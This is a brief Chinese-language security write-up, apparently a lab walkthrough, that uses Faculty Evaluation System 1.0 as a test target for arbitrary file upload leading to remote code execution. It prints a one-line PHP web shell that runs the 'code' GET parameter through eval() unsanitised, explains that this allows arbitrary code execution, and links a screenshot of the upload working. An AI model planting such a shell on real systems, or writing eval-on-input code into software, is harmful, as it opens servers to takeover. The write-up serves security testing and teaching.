
Faculty Evaluation System 1.0 是一個很好的漏洞測試平台(雖然不太應該這樣玩它)，但因為他在這版本有相關漏洞可以測試，就拿來當範例~~

首先可以創建一個很簡易的php去觸發
以下 php 程式將採用 GET 參數代碼並通過 eval() 函數運行它，而不進行任何輸入清理：

**$_GET[" "]被傳遞給eval()函數，這意味著該字符串將被解釋為有效的PHP code並執行。它允許攻擊者執行任意的PHP code**

```php
<?php $code = $_GET['code'];
eval($code); ?>
```
當你看到這頁面就知道程式運行成功，看起來可以做其他測試
![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/7dbac24e-7e55-4050-8014-0b1ab115f15c)
